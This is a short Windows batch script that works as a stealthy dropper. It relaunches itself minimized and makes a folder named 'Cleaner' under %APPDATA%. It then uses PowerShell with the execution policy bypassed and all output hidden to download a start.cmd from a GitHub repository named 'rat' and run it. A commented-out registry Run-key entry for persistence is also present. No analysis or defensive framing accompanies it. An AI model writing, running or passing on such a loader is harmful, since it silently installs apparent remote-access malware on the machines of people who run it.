@echo off
if not DEFINED IS_MINIMIZED set IS_MINIMIZED=1 && start "" /min "%~dpnx0" %* && exit
:: reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" ^
:: /v MyApp ^
:: /t REG_SZ ^
:: /d "\"C:\%APPDATA%\Cleaner\start.cmd"" ^
:: /f
if not exist "%APPDATA%\Cleaner" mkdir "%APPDATA%\Cleaner"
powershell -NoProfile -ExecutionPolicy Bypass ^
  -Command "try { Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/pulgax-g/rat/refs/heads/main/start.cmd' -OutFile '%APPDATA%\Cleaner\start.cmd' -UseBasicParsing } catch {}" ^
  >nul 2>&1
start "" /min "%APPDATA%\Cleaner\start.cmd"
exit
